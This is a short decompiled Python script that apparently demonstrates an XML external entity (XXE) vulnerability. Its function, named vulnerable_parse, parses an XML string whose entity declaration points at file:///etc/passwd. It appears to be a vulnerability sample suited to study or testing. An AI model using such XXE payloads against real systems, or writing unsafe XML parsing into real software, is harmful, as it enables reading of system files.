# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 429_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 430 bytes
import xml.etree.ElementTree as ET

def vulnerable_parse(xml_string):
    return ET.fromstring(xml_string)


xml_data = '<?xml version="1.0"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<root>\n    <element>&xxe;</element>\n</root>'
vulnerable_xml = vulnerable_parse(xml_data)
print(vulnerable_xml)

# okay decompiling 429_1.pyc
